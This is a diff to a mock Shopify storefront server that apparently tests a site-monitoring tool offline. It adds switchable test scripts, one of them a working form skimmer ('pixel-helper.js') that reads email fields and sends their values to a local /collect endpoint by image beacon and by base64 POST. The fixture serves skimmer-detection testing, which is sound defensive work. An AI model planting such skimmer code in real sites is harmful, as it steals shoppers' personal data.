@@ -2,7 +2,8 @@
  * A small fake Shopify storefront for testing Store Guard offline.
  * Mirrors Dawn-theme markup and Shopify's public endpoints.
  * Breakage switches (env MOCK_BREAK, comma separated): atc, search, checkout, noindex, links, jserror, password
- * Script extras (env MOCK_EXTRA): newscript, badscript (see NEW_SCRIPT and BAD_SCRIPT below).
+ * Script extras (env MOCK_EXTRA): newscript, badscript (see NEW_SCRIPT and BAD_SCRIPT below);
+ * skimmer, formreader (form-field readers, see FORM_EXTRAS below).
  */
 import http from 'node:http';
 import { URL } from 'node:url';
@@ -22,9 +23,27 @@ const TRACK = EXTRA.includes('track');
 // Script watch: newscript adds an app script from another site to every page; badscript adds one from a
 // site on the known-bad list (tests add evil-cdn.localhost to BAD_DOMAINS). *.localhost always reaches this machine.
 // Both can also be switched on and off while the store runs: GET /__extra?newscript=1&badscript=0.
-const LIVE_EXTRA = new Set(['newscript', 'badscript'].filter((k) => EXTRA.includes(k)));
+// FORM_EXTRAS: both add an email sign-up box to every page, read by the store's own script (never reported).
+//   skimmer     an outside script (127.0.0.1) that listens to the email box and sends what was typed to /collect
+//   formreader  an outside script (127.0.0.1) that reads the email box but sends nothing (like a chat widget)
+const FORM_EXTRAS = ['skimmer', 'formreader'];
+const LIVE_EXTRA = new Set(['newscript', 'badscript', ...FORM_EXTRAS].filter((k) => EXTRA.includes(k)));
+const COLLECTED = []; // what the skimmer sent, for tests: GET /__collected
+const formBox = () => (FORM_EXTRAS.some((k) => LIVE_EXTRA.has(k)) ? '<form class="newsletter" onsubmit="return false"><label for="NewsletterEmail">Email</label> <input type="email" id="NewsletterEmail" name="contact[email]" autocomplete="email"></form>' : '');
 const scriptTags = () => (LIVE_EXTRA.has('newscript') ? `<script src="http://127.0.0.1:${PORT}/apps/review-widget.js?v=${Date.now()}"></script>` : '')
-  + (LIVE_EXTRA.has('badscript') ? `<script src="http://evil-cdn.localhost:${PORT}/lib/m.js"></script>` : '');
+  + (LIVE_EXTRA.has('badscript') ? `<script src="http://evil-cdn.localhost:${PORT}/lib/m.js"></script>` : '')
+  + (FORM_EXTRAS.some((k) => LIVE_EXTRA.has(k)) ? '<script src="/assets/newsletter.js"></script>' : '')
+  + (LIVE_EXTRA.has('skimmer') ? `<script src="http://127.0.0.1:${PORT}/apps/pixel-helper.js"></script>` : '')
+  + (LIVE_EXTRA.has('formreader') ? `<script src="http://127.0.0.1:${PORT}/apps/chat-widget.js"></script>` : '');
+const FORM_JS = {
+  // The store's own sign-up script: listens to and reads the box (allowed).
+  '/assets/newsletter.js': "document.addEventListener('DOMContentLoaded',function(){var i=document.getElementById('NewsletterEmail');if(!i)return;i.addEventListener('change',function(){window.__signup=i.value;});});",
+  // A skimmer: listens to the email box and sends its value elsewhere, twice (image beacon and a POST with base64).
+  '/apps/pixel-helper.js': `(function(){function grab(e){var v=e.target.value;if(!v)return;new Image().src='http://127.0.0.1:${PORT}/collect?e='+encodeURIComponent(v);fetch('http://127.0.0.1:${PORT}/collect',{method:'POST',mode:'no-cors',body:JSON.stringify({d:btoa(v)})});}
+document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('input[type=email]').forEach(function(i){i.addEventListener('change',grab);});});})();`,
+  // A chat widget that pre-fills its own form from the sign-up box: reads it, sends nothing.
+  '/apps/chat-widget.js': "document.addEventListener('DOMContentLoaded',function(){var i=document.getElementById('NewsletterEmail');if(!i)return;i.addEventListener('input',function(){window.__chatEmail=i.value;});});",
+};
 const products = [
   { id: 1, title: 'Organic Cotton Kurta', handle: 'cotton-kurta', body_html: '<p>Soft breathable organic cotton kurta for everyday wear.</p>', product_type: 'Kurta', vendor: 'Tharam', tags: 'cotton, festive', images: [{ src: '/img/k.png' }], variants: [
     { id: 101, title: 'Small', sku: 'KUR-S', price: EXTRA.includes('price') ? '699.00' : '1499.00', compare_at_price: EXTRA.includes('sale') ? '1299.00' : null, available: true },
@@ -74,7 +93,7 @@ ${B.has('noindex') || noindex ? '<meta name="robots" content="noindex">' : ''}
 <script>window.Shopify={shop:'mock.myshopify.com',theme:${DRAFT ? "{id:222,name:'Dawn – Diwali draft',role:'unpublished'}" : "{id:111,name:'Dawn',role:'main'}"}};</script>
 ${B.has('jserror') ? '<script>setTimeout(function(){ undefinedAppFunction(); }, 10);</script>' : ''}<script src="/assets/theme.js?v=111"></script>${scriptTags()}
 ${B.has('theme') ? '<style>body{background:#fff4d6} h1{color:#b3261e;font-size:48px}</style>' : ''}</head><body>${B.has('theme') ? '<div style="background:#b3261e;color:#fff;padding:18px;font:700 22px sans-serif">DIWALI SALE · 40% OFF</div>' : ''}<header><a href="/">Mock Store</a> <nav><a href="/collections/all">Shop</a> <a href="/pages/about">About</a> <a href="/search">Search</a> ${B.has('links') ? '<a href="/pages/old-sale">Sale</a> <a href="/collections/discontinued">Old</a>' : ''} <a href="/cart">Cart</a></nav></header>
-<main id="MainContent">${body}</main>${DRAFT ? '<iframe id="preview-bar-iframe" style="position:fixed;bottom:0;left:0;width:100%;height:60px;border:0;background:#222"></iframe>' : ''}<footer><a href="/policies/privacy-policy">${DE ? 'Datenschutz' : 'Privacy'}</a> <a href="/policies/refund-policy">${DE ? 'Widerrufsbelehrung' : 'Refunds'}</a>${DE ? ' <a href="/pages/impressum">Impressum</a> <a href="/policies/terms-of-service">AGB</a> <a href="/pages/accessibility">Barrierefreiheit</a> <a href="https://ec.europa.eu/consumers/odr">OS-Plattform</a> <a class="withdraw" href="/pages/widerruf" style="font-weight:700">Vertrag widerrufen</a>' : ''}</footer>${TRACK ? '<script src="https://connect.facebook.net/en_US/fbevents.js" async></script>' : ''}</body></html>`;
+<main id="MainContent">${body}</main>${formBox()}${DRAFT ? '<iframe id="preview-bar-iframe" style="position:fixed;bottom:0;left:0;width:100%;height:60px;border:0;background:#222"></iframe>' : ''}<footer><a href="/policies/privacy-policy">${DE ? 'Datenschutz' : 'Privacy'}</a> <a href="/policies/refund-policy">${DE ? 'Widerrufsbelehrung' : 'Refunds'}</a>${DE ? ' <a href="/pages/impressum">Impressum</a> <a href="/policies/terms-of-service">AGB</a> <a href="/pages/accessibility">Barrierefreiheit</a> <a href="https://ec.europa.eu/consumers/odr">OS-Plattform</a> <a class="withdraw" href="/pages/widerruf" style="font-weight:700">Vertrag widerrufen</a>' : ''}</footer>${TRACK ? '<script src="https://connect.facebook.net/en_US/fbevents.js" async></script>' : ''}</body></html>`;
 }
 function send(res, status, body, type = 'text/html; charset=utf-8') {
   res.writeHead(status, { 'Content-Type': type });
@@ -100,9 +119,17 @@ const server = http.createServer(async (req, res) => {
     res.writeHead(403, { 'Content-Type': 'text/html', 'cf-ray': '8f00test-BOM', server: 'cloudflare' });
     return res.end('<!doctype html><html><head><title>Just a moment...</title></head><body><div id="challenge-form">Verify you are human</div><script>window._cf_chl_opt={}</script></body></html>');
   }
+  if (p === '/collect') {
+    const body = req.method === 'POST' ? await readBody(req) : '';
+    COLLECTED.push({ method: req.method, query: u.search, body });
+    res.writeHead(204, { 'Access-Control-Allow-Origin': '*' });
+    return res.end();
+  }
+  if (p === '/__collected') return send(res, 200, { collected: COLLECTED }, 'application/json');
+  if (FORM_JS[p]) return send(res, 200, FORM_JS[p], 'application/javascript');
   if (p === '/__pwcount') return send(res, 200, { posts: PW_POSTS }, 'application/json');
   if (p === '/__extra') {
-    for (const k of ['newscript', 'badscript']) if (u.searchParams.has(k)) u.searchParams.get(k) === '1' ? LIVE_EXTRA.add(k) : LIVE_EXTRA.delete(k);
+    for (const k of ['newscript', 'badscript', ...FORM_EXTRAS]) if (u.searchParams.has(k)) u.searchParams.get(k) === '1' ? LIVE_EXTRA.add(k) : LIVE_EXTRA.delete(k);
     return send(res, 200, { extra: [...LIVE_EXTRA] }, 'application/json');
   }
   if (B.has('password') && !/storefront_digest=ok/.test(req.headers.cookie || '') && !p.startsWith('/password')) {
